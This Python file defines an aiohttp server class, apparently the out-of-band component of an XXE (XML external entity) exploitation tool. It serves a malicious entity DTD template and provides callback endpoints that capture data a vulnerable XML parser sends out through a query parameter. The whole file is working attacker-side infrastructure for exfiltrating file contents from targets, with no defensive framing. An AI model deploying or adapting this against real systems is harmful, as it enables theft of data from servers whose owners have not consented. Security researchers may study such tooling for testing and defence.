from aiohttp import web
import asyncio
import random
import functools
from typing import Dict

ENTITY_INJECTION_TEMPLATE = "<!DOCTYPE stuff [<!ELEMENT data ANY> <!ENTITY goodies \"{0}\">]> <data>&goodies;</data>"


def _wrapper(func):
    """
    Wrap an aiohttp view function so it can just return a string or integer
    """
    @functools.wraps(func)
    def _inner(*args, **kwargs):
        res = func(*args, **kwargs)

        if isinstance(res, str):
            return web.Response(text=res, content_type='text/xml')
        elif isinstance(res, int):
            return web.Response(status=res)
        else:
            raise RuntimeError(f'Unhandled response: {res}')

    return _inner


class OOBHttpServer:
    test_data_url = "/test/data"
    test_entity_url = "/test/entity"

    def __init__(self, external_ip, port):
        self.port = port
        self.external_ip = external_ip

        self.expectations: Dict[str, asyncio.Future] = {}
        self.entity_files = {}

        self.test_response_value = random.randint(1, 10_000_00)

        self._tick = 0
        self._server = None

        self.app = self.create_app()

    @property
    def location(self):
        return f'http://{self.external_ip}:{self.port}'

    def create_app(self):
        app = web.Application()
        app.router.add_route("GET", self.test_data_url, _wrapper(self.test_handler))
        app.router.add_route("GET", self.test_entity_url, _wrapper(self.test_entity_handler))
        app.router.add_route("GET", "/entity/{id}", _wrapper(self.entity_handler))
        app.router.add_route("GET", "/data/{id}", _wrapper(self.data_handler))
        return app

    def test_handler(self, request: web.Request):
        return f"<data>{self.test_response_value}</data>"

    def test_entity_handler(self, request: web.Request):
        return ENTITY_INJECTION_TEMPLATE.format(self.test_response_value)

    def entity_handler(self, request: web.Request):
        file_id = request.match_info["id"]
        if not self.expecting_identifier(file_id):
            return 404

        value = self.entity_files[file_id]
        return ENTITY_INJECTION_TEMPLATE.format(value)

    def data_handler(self, request: web.Request):
        expect_id = request.match_info['id']

        if not self.expecting_identifier(expect_id):
            return 404

        query = request.rel_url.query
        data = query.get('d', '')
        self.got_data(expect_id, data)
        return f"<data>{self.test_response_value}</data>"

    def got_data(self, expect_id, data):
        self.expectations[expect_id].set_result(data)
        del self.expectations[expect_id]

    def expecting_identifier(self, id):
        return id in self.expectations

    def get_identifier(self):
        self._tick += 1
        return str(self._tick)

    def expect_data(self):
        identifier, future = self.get_identifier(), asyncio.Future()
        self.expectations[identifier] = future
        return f'{self.location}/data/{identifier}', future

    def expect_entity_injection(self, entity_value):
        identifier, future = self.expect_data()
        self.entity_files[identifier] = entity_value
        return f'{self.location}/entity/{identifier}', future

    async def start(self):
        loop = asyncio.get_event_loop()
        self._server = await loop.create_server(
            self.app.make_handler(),
            '0.0.0.0',
            self.port
        )

        if not self.port:
            self.port = self._server.sockets[0].getsockname()[1]

    async def stop(self):
        self._server.close()
        await self._server.wait_closed()
